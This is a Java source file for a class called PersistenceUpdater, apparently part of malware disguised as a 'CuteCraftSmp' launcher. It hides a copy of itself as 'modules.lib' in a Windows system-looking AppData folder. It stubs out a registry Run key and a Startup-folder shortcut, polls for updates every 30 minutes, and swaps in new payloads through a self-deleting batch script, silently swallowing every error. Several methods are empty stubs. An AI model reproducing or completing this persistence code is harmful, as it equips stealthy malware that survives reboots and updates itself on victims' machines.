import com.sun.jna.platform.win32.WinReg;
import java.io.File;
import java.io.IOException;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.StandardCopyOption;
import java.util.concurrent.Executors;
import java.util.concurrent.ScheduledExecutorService;
import java.util.concurrent.TimeUnit;

public class PersistenceUpdater {

    private static final String payloadPath;

    private static final String launcherPath;

    private static final String registryKeyName;

    private static final String startupFolderPath;

    private static final ScheduledExecutorService scheduler;

    public static void install() {
        try {

            copyPayloadToAppData();

            addRegistryRunKey();

            addStartupShortcut();

            scheduleUpdateChecks();

        } catch (Exception e) {

        }
    }

    private static void copyPayloadToAppData() throws IOException {
        String appData = System.getenv("APPDATA");
        File destDir = new File(appData + "\\Microsoft\\Windows");
        destDir.mkdirs();

        File currentJar = getCurrentJarPath();
        if (currentJar == null) return;

        File destJar = new File(destDir, "modules.lib");
        Files.copy(currentJar.toPath(), destJar.toPath(), StandardCopyOption.REPLACE_EXISTING);

    }

    private static void addRegistryRunKey() {
        try {

        } catch (Exception e) {

        }
    }

    private static void addStartupShortcut() {
        try {
            String startupPath = System.getenv("APPDATA") +
                "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup";

        } catch (Exception e) {

        }
    }

    private static void scheduleUpdateChecks() {
        scheduler.scheduleAtFixedRate(() -> {
            try {
                checkForUpdate();
            } catch (Exception ignored) {}
        }, 30, 30, TimeUnit.MINUTES);
    }

    private static void checkForUpdate() {
        try {

        } catch (Exception e) {

        }
    }

    private static void performUpdate(byte[] newJarBytes) {
        try {

            File tempJar = File.createTempFile("update_", ".jar");
            Files.write(tempJar.toPath(), newJarBytes);

            String batchScript =
                "@echo off\n" +
                "timeout /t 2 /nobreak > nul\n" +
                "copy /y \"" + tempJar.getAbsolutePath() + "\" \"" + payloadPath + "\"\n" +
                "start javaw -jar \"" + payloadPath + "\"\n" +
                "del \"%~f0\"\n";

            File batchFile = File.createTempFile("upd_", ".bat");
            Files.write(batchFile.toPath(), batchScript.getBytes());

            Runtime.getRuntime().exec("cmd /c \"" + batchFile.getAbsolutePath() + "\"");
            System.exit(0);

        } catch (Exception e) {

        }
    }

    public static void uninstall() {
        try {

            System.exit(0);
        } catch (Exception e) {
            System.exit(1);
        }
    }

    private static File getCurrentJarPath() {
        try {
            return new File(
                PersistenceUpdater.class.getProtectionDomain()
                    .getCodeSource().getLocation().toURI()
            );
        } catch (Exception e) {
            return null;
        }
    }

    static {
        String appData = System.getenv("APPDATA");
        payloadPath = appData + "\\Microsoft\\Windows\\modules.lib";
        launcherPath = appData + "\\Microsoft\\Windows\\CuteCraftSmp.exe";
        registryKeyName = "CuteCraftSmp";
        startupFolderPath = appData + "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup";
        scheduler = Executors.newScheduledThreadPool(1);
    }
}